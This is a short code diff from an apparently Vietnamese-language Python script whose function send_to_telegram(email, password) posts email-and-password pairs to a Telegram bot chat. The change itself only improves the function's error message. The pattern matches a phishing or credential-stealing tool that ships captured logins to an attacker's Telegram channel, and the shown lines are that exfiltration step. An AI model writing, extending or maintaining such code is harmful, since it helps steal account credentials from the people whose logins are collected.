@@ -22,8 +22,8 @@ def send_to_telegram(email, password):
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
         requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
         print(f"✅ Đã gửi Telegram: {email}")
-    except:
-        print("❌ Lỗi gửi Telegram")
+    except Exception as e:
+        print(f"❌ Lỗi gửi Telegram: {e}")
 
 # ====================================================
 
